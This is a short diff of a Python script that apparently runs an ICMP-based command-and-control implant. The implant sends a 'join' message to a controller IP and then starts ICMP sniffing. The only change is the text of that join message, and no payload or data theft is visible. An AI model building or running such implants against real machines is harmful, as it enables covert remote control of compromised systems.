@@ -42,7 +42,7 @@ if __name__ == "__main__":
     print(implant)
     # Send join command
     print(" $ Sent join command")
-    implant.send(implant.controller_ip, "join", "hello")
+    implant.send(implant.controller_ip, "join", "hello how are you")
 
     # Start sniffing
     print("[ ICMP Sniffing Started ]")
